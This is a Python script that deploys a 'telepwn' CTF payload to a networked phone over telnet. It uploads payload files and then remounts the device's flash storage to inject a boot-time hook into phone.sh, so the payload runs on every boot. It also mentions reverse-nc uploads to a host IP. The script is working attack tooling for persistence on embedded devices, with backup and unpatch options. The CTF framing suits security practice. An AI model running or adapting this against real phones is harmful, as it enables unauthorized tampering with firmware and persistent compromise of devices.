#!/usr/bin/env python3
"""Deploy the telepwn CTF payload to a phone, and optionally patch phone.sh.

Two stages, separated on purpose:

  stage  (safe, no flash edit): upload divert.sh + run.sh + lcdfb + splash.png to
         /data/telepwn, with the provisioning server IP baked into divert.sh.

  patch  (writes flash): remount /phone rw, back up phone.sh, inject ONE guarded line
         after `phone_common`, verify with `sh -n`, remount ro. Idempotent.

Usage:
  deploy.py PHONE_IP --stage [--server 10.42.0.1] [--host-ip 10.42.0.1]
  deploy.py PHONE_IP --patch            # inject the phone.sh hook (needs stage first)
  deploy.py PHONE_IP --unpatch          # remove the hook, restore normal boot
"""
import argparse
import os

from ptelnet import Phone
from push import push_file

HERE = os.path.dirname(os.path.abspath(__file__))
LCDFB = os.path.join(
    HERE, "..", "..", "tools", "lcdfb", "target",
    "arm-unknown-linux-musleabi", "release", "lcdfb")
SPLASH = os.path.join(HERE, "..", "assets", "splash.png")

REMOTE_DIR = "/data/telepwn"
PHONE_SH = "/phone/scripts/phone.sh"
# single guarded line injected into phone.sh after `phone_common`
HOOK = f"[ -f {REMOTE_DIR}/divert.sh ] && . {REMOTE_DIR}/divert.sh"
HOOK_TAG = "# telepwn-hook"


def render_divert(server_ip):
    src = open(os.path.join(HERE, "divert.sh")).read()
    return src.replace("__PROV_SRV__", server_ip)


def stage(phone_ip, server_ip, host_ip):
    divert = render_divert(server_ip)
    tmp = os.path.join(HERE, "__divert_rendered.sh")
    open(tmp, "w").write(divert)
    try:
        with Phone(phone_ip) as p:
            for local, remote, chmod in [
                (LCDFB, f"{REMOTE_DIR}/lcdfb", True),
                (SPLASH, f"{REMOTE_DIR}/splash.png", False),
                (os.path.join(HERE, "run.sh"), f"{REMOTE_DIR}/run.sh", True),
                (tmp, f"{REMOTE_DIR}/divert.sh", True),  # sourced, but +x is harmless
            ]:
                ok, n, listing = push_file(p, local, remote, host_ip=host_ip, chmod=chmod)
                print(f"[{'+' if ok else '-'}] {remote}: {listing}")
            # sanity: divert.sh must be syntactically valid before it can be sourced
            chk = p.run(f"sh -n {REMOTE_DIR}/divert.sh && echo SYNTAX_OK")
            print(f"[*] divert.sh syntax: {chk.strip() or 'FAILED'}")
    finally:
        os.remove(tmp)


BASE_PHONE_SH = os.path.join(
    HERE, "..", "..", "..", "filesystem", "phone", "scripts", "phone.sh")


def build_patched_phone_sh():
    """Inject the guarded hook right after the standalone `phone_common` call.
    Built from the verified base (on-device copy is byte-identical modulo CRLF)."""
    lines = open(BASE_PHONE_SH).read().replace("\r\n", "\n").split("\n")
    out, injected = [], False
    for ln in lines:
        out.append(ln)
        if not injected and ln.strip() == "phone_common":
            indent = ln[: len(ln) - len(ln.lstrip())]
            out.append(f"{indent}{HOOK}  {HOOK_TAG}")
            injected = True
    if not injected:
        raise RuntimeError("could not find `phone_common` call line in base phone.sh")
    return "\n".join(out) + "\n"


def patch(phone_ip):
    patched = build_patched_phone_sh()
    tmp = os.path.join(HERE, "__phone_sh_patched")
    open(tmp, "w", newline="\n").write(patched)
    try:
        with Phone(phone_ip) as p:
            if HOOK_TAG in p.run(f"grep -c telepwn-hook {PHONE_SH}; grep telepwn-hook {PHONE_SH}"):
                print("[*] hook already present; nothing to do")
                return
            p.run("mount -o remount,rw /phone")
            p.run(f"[ -f {PHONE_SH}.telepwn-bak ] || cp {PHONE_SH} {PHONE_SH}.telepwn-bak")
            ok_serve, n, listing = push_file(p, tmp, PHONE_SH)
            p.run(f"chmod 700 {PHONE_SH}")
            print(f"[{'+' if ok_serve else '-'}] pushed phone.sh ({n} bytes): {listing}")
            syn = p.run(f"sh -n {PHONE_SH} && echo SYNTAX_OK").strip()
            present = HOOK_TAG in p.run(f"grep telepwn-hook {PHONE_SH}")
            print(f"[*] phone.sh syntax: {syn or 'FAILED'};  hook present: {present}")
            if "SYNTAX_OK" not in syn or not present or not ok_serve:
                print("[-] verification FAILED -- restoring backup")
                p.run(f"cp {PHONE_SH}.telepwn-bak {PHONE_SH}; chmod 700 {PHONE_SH}")
            p.run("mount -o remount,ro /phone")
            print("[*] context around hook:")
            print(p.run(f"grep -n telepwn-hook {PHONE_SH}"))
    finally:
        os.remove(tmp)


def unpatch(phone_ip):
    with Phone(phone_ip) as p:
        p.run("mount -o remount,rw /phone")
        p.run(f"sed -i '/telepwn-hook/d' {PHONE_SH}")
        ok = p.run(f"sh -n {PHONE_SH} && echo SYNTAX_OK").strip()
        p.run("mount -o remount,ro /phone")
        print(f"[*] hook removed; phone.sh syntax: {ok or 'FAILED'}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("phone_ip")
    ap.add_argument("--server", default="10.42.0.1", help="server IP the phone pings")
    ap.add_argument("--host-ip", default="10.42.0.1", help="IP for reverse-nc uploads")
    ap.add_argument("--stage", action="store_true")
    ap.add_argument("--patch", action="store_true")
    ap.add_argument("--unpatch", action="store_true")
    args = ap.parse_args()

    if args.stage:
        stage(args.phone_ip, args.server, args.host_ip)
    if args.patch:
        patch(args.phone_ip)
    if args.unpatch:
        unpatch(args.phone_ip)
    if not (args.stage or args.patch or args.unpatch):
        ap.error("choose --stage, --patch, and/or --unpatch")


if __name__ == "__main__":
    main()
